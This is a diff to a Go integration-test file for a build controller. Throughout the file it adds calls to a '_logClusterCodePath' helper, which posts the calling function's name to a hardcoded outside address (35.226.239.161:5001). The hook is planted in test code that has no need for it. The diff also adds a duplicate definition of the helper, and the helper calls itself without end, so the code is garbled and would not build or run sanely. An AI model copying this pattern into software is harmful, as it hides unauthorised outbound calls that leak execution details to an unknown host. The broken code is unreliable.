@@ -62,9 +62,13 @@ func mockBuild() *buildv1.Build {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &buildv1.Build{ObjectMeta: metav1.ObjectMeta{GenerateName: "mock-build", Labels: map[string]string{"label1": "value1", "label2": "value2", buildutil.BuildConfigLabel: "mock-build-config", buildutil.BuildRunPolicyLabel: string(buildv1.BuildRunPolicyParallel)}}, Spec: buildv1.BuildSpec{CommonSpec: buildv1.CommonSpec{Source: buildv1.BuildSource{Git: &buildv1.GitBuildSource{URI: "http://my.docker/build"}, ContextDir: "context"}, Strategy: buildv1.BuildStrategy{DockerStrategy: &buildv1.DockerBuildStrategy{}}, Output: buildv1.BuildOutput{To: &corev1.ObjectReference{Kind: "DockerImage", Name: "namespace/builtimage"}}}}}
 }
 func RunBuildControllerTest(t testingT, buildClient buildv1clienttyped.BuildsGetter, kClientset kubernetes.Interface, ns string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -143,6 +147,8 @@ type buildControllerPodTest struct {
 }
 
 func RunBuildControllerPodSyncTest(t testingT, buildClient buildv1clienttyped.BuildsGetter, kClient kubernetes.Interface, ns string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -284,6 +290,8 @@ func waitForWatch(t testingT, name string, w watchapi.Interface) *watchapi.Event
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	select {
 	case e, ok := <-w.ResultChan():
 		if !ok {
@@ -296,6 +304,8 @@ func waitForWatch(t testingT, name string, w watchapi.Interface) *watchapi.Event
 	}
 }
 func RunImageChangeTriggerTest(t testingT, clusterAdminBuildClient buildv1clienttyped.BuildV1Interface, clusterAdminImageClient imagev1clienttyped.ImageV1Interface, ns string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -469,6 +479,8 @@ func RunBuildDeleteTest(t testingT, clusterAdminClient buildv1clienttyped.Builds
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	buildWatch, err := clusterAdminClient.Builds(ns).Watch(metav1.ListOptions{})
 	if err != nil {
 		t.Fatalf("Couldn't subscribe to Builds %v", err)
@@ -517,6 +529,8 @@ func waitForWatchType(t testingT, name string, w watchapi.Interface, expect watc
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	tries := 3
 	for i := 0; i < tries; i++ {
 		select {
@@ -534,6 +548,8 @@ func waitForWatchType(t testingT, name string, w watchapi.Interface, expect watc
 	return nil
 }
 func RunBuildRunningPodDeleteTest(t testingT, clusterAdminClient buildv1clienttyped.BuildsGetter, clusterAdminKubeClientset kubernetes.Interface, ns string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -643,6 +659,8 @@ func RunBuildCompletePodDeleteTest(t testingT, clusterAdminClient buildv1clientt
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	buildWatch, err := clusterAdminClient.Builds(ns).Watch(metav1.ListOptions{})
 	if err != nil {
 		t.Fatalf("Couldn't subscribe to Builds %v", err)
@@ -709,6 +727,8 @@ func RunBuildConfigChangeControllerTest(t testingT, clusterAdminBuildClient buil
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	config := configChangeBuildConfig(ns)
 	created, err := clusterAdminBuildClient.BuildConfigs(ns).Create(config)
 	if err != nil {
@@ -751,6 +771,8 @@ func configChangeBuildConfig(ns string) *buildv1.BuildConfig {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	bc := &buildv1.BuildConfig{}
 	bc.Name = "testcfgbc"
 	bc.Namespace = ns
@@ -762,6 +784,8 @@ func configChangeBuildConfig(ns string) *buildv1.BuildConfig {
 	return bc
 }
 func mockImageStream2(registryHostname, tag string) *imagev1.ImageStream {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -793,9 +817,13 @@ func mockImageStreamMapping(stream, image, tag, reference string) *imagev1.Image
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &imagev1.ImageStreamMapping{ObjectMeta: metav1.ObjectMeta{Name: stream}, Tag: tag, Image: imagev1.Image{ObjectMeta: metav1.ObjectMeta{Name: image}, DockerImageReference: reference}}
 }
 func imageChangeBuildConfig(ns, name string, strategy buildv1.BuildStrategy) *buildv1.BuildConfig {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	_logClusterCodePath()
@@ -827,6 +855,8 @@ func stiStrategy(kind, name string) buildv1.BuildStrategy {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return buildv1.BuildStrategy{SourceStrategy: &buildv1.SourceBuildStrategy{From: corev1.ObjectReference{Kind: kind, Name: name}}}
 }
 func _logClusterCodePath() {
@@ -844,6 +874,27 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
@@ -918,5 +969,5 @@ func _logClusterCodePath() {
 	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
-	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
